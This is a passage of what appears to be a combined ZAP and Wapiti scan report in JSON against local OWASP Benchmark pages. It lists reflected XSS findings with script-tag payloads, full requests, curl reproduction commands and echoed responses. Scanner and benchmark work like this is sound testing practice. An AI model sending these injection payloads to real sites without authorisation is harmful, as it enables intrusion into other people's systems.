            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01657?BenchmarkTest01657=%3C%2Fp%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cp%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01657.html?BenchmarkTest01657=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01657?username=alice&password=Letm3in_&BenchmarkTest01657=%3CScRiPt%3Ealert%28%27wrq9xi2pej%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '110', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:10 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and </p><scrIpt>alert(1);</scRipt><p>.\\n</p>\\n</body>\\n</html>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '113', 'date': 'Sun, 31 Aug 2025 04:22:01 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and <ScRiPt>alert('wrq9xi2pej')</sCrIpT>.\\n</p>\\n</body>\\n</html>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01658?BenchmarkTest01658=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01658?username=alice&password=Letm3in_&BenchmarkTest01658=%3CScRiPt%3Ealert%28%27w44jiytsgx%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w44jiytsgx')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w44jiytsgx')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01658?username=alice&password=Letm3in_&BenchmarkTest01658=%3CScRiPt%3Ealert%28%27w44jiytsgx%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01658.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01658"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01658?BenchmarkTest01658=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01658.html?BenchmarkTest01658=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01658?username=alice&password=Letm3in_&BenchmarkTest01658=%3CScRiPt%3Ealert%28%27w44jiytsgx%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:11 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:22:01 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('w44jiytsgx')</sCrIpT>.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01660?BenchmarkTest01660=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01660?username=alice&password=Letm3in_&BenchmarkTest01660=%3CScRiPt%3Ealert%28%27w7hygyf82w%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w7hygyf82w')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w7hygyf82w')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01660?username=alice&password=Letm3in_&BenchmarkTest01660=%3CScRiPt%3Ealert%28%27w7hygyf82w%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01660.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01660"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01660?BenchmarkTest01660=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01660.html?BenchmarkTest01660=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01660?username=alice&password=Letm3in_&BenchmarkTest01660=%3CScRiPt%3Ealert%28%27w7hygyf82w%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:11 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:02 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w7hygyf82w')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01662?BenchmarkTest01662=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01662?username=alice&password=Letm3in_&BenchmarkTest01662=%3CScRiPt%3Ealert%28%27wtm2ubgv52%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wtm2ubgv52')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wtm2ubgv52')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01662?username=alice&password=Letm3in_&BenchmarkTest01662=%3CScRiPt%3Ealert%28%27wtm2ubgv52%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01662.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01662"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01662?BenchmarkTest01662=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01662.html?BenchmarkTest01662=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01662?username=alice&password=Letm3in_&BenchmarkTest01662=%3CScRiPt%3Ealert%28%27wtm2ubgv52%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:11 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:22:03 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('wtm2ubgv52')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01665?BenchmarkTest01665=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01665?username=alice&password=Letm3in_&BenchmarkTest01665=%3CScRiPt%3Ealert%28%27wem2lxvw1j%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wem2lxvw1j')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wem2lxvw1j')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01665?username=alice&password=Letm3in_&BenchmarkTest01665=%3CScRiPt%3Ealert%28%27wem2lxvw1j%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01665.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01665"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01665?BenchmarkTest01665=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01665.html?BenchmarkTest01665=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01665?username=alice&password=Letm3in_&BenchmarkTest01665=%3CScRiPt%3Ealert%28%27wem2lxvw1j%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '37', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:11 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '47', 'date': 'Sun, 31 Aug 2025 04:22:04 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wem2lxvw1j')</sCrIpT>_SafeStuff\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01667?BenchmarkTest01667=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01667?username=alice&password=Letm3in_&BenchmarkTest01667=%3CScRiPt%3Ealert%28%27wh0r3p7jac%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wh0r3p7jac')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wh0r3p7jac')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01667?username=alice&password=Letm3in_&BenchmarkTest01667=%3CScRiPt%3Ealert%28%27wh0r3p7jac%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01667.html\""
              }
            }
          ],
          "message": {
            "text": [
